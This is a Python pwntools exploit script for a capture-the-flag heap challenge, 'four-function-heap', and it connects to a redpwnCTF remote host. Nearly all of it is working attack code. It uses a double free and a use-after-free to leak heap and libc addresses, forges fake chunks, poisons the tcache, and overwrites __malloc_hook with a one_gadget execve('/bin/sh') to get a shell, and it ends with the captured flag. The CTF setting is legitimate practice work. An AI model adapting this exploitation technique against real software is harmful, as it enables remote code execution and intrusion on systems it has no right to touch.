#0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  rsp & 0xf == 0
#  rcx == NULL
#
#0x4f322 execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  [rsp+0x40] == NULL
#
#0x10a38c execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL

from pwn import *
from sys import argv

def alloc(p, index, size, content):
    log.info(f'alloc({index})')
    p.sendlineafter('prompts.menu', '1')
    p.sendlineafter('index', str(index))
    p.sendlineafter('size', str(size))
    p.sendlineafter('read', content)

def free(p, index):
    log.info(f'free({index})')
    p.sendlineafter('prompts.menu', '2')
    p.sendlineafter('index', str(index))

def show(p, index):
    p.sendlineafter('prompts.menu', '3')
    p.sendlineafter('index', str(index))

if 'debug' in argv:
    p = gdb.debug('./four-function-heap', 'c')
elif 'remote' in argv:
    p = remote('2020.redpwnc.tf', 31774)
else:
    p = process('./four-function-heap')

libc_elf = ELF('./libc.so.6')

# double free + uaf to get heap leak
alloc(p, 0, 0x10, 'a')
free(p, 0)
free(p, 0)
show(p, 0)
p.recvuntil('}}: ')
heap = u64(p.recv(6) + b'\x00\x00') - 0x260
log.info(hex(heap))

# writing fake chunks
# one will be freed, others are there to avoid security checks
# 0x100 0x501 [...] 0x500 0x21  0 0 0x20 0x21
fake_chunks = p64(0x100) + p64(0x501) + b'a' * (0x500 - 0x10) + p64(0x500) + p64(0x21) + p64(0x0) * 2 + p64(0x20) + p64(0x21)
fake_chunk1 = p64(heap + 0x50) + p64(0x501) # prev_size of this chunk will be inserted into tcache. so i'm setting it to a useful value :) (tcache 0x20 head)
alloc(p, 0, 0x4f0, fake_chunk1)

fake_chunk2 = p64(0x500) + p64(0x21) + p64(0x0) * 2 + p64(0x20) + p64(0x21)
alloc(p, 0, 0x40, fake_chunk2)

# get fake chunk and free it
alloc(p, 0, 0x10, p64(heap + 0x280))
alloc(p, 0, 0x10, p64(heap + 0x280))
alloc(p, 0, 0x10, p64(heap + 0x280))
free(p, 0)

# libc leak!
show(p, 0)
p.recvuntil('}}: ')
libc = u64(p.recv(6) + b'\x00\x00') - (0x7fa5f8e2bca0 - 0x00007fa5f8a40000)
log.info(hex(libc))

# now we write one_gadget to malloc hook
gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
gadget = libc + gadgets[2]
malloc_hook = libc + libc_elf.sym['__malloc_hook']
alloc(p, 0, 0x10, p64(malloc_hook)) # using tcache 0x20 head we set earlier with fake_chunk1
alloc(p, 0, 0x10, p64(gadget))
log.info(f'alloc(0)')
p.sendlineafter('prompts.menu', '1')
p.sendlineafter('index', str(0))
p.sendlineafter('size', str(0x50))
p.interactive() # flag{g3n3ric_f1ag_1n_1e3t_sp3ak}
